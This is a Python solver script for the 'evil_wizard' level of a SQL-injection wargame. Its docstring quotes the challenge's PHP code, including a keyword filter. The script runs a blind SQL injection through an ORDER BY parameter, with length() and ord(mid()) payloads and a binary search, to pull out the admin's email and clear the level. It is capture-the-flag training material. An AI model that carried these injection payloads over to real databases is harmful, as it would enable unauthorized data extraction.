#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def check_func(response: str) -> bool:
    return response.index('admin') < response.index('rubiya')


def main():
    '''
    Evil_wizard

    if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
    $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}";
    echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
    $rows = mysqli_query($db,$query);
    while(($result = mysqli_fetch_array($rows))){
      if($result['id'] == "admin") $result['email'] = "**************";
      echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
    }
    echo "</table><hr>query : <strong>{$query}</strong><hr>";

    $_GET[email] = addslashes($_GET[email]);
    $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
    '''

    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
    max_key_len = 32

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = "id='admin' and length(email)>%s desc"
    param = dict(order=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    payload = "id='admin' and ord(mid(email,%s,1))%s desc"
    param = dict(order=payload)
    result = los.find_binary(url, param, check_func,
                             32, 127, len_of_key, cook)

    param = dict(email=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Evil_wizard Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
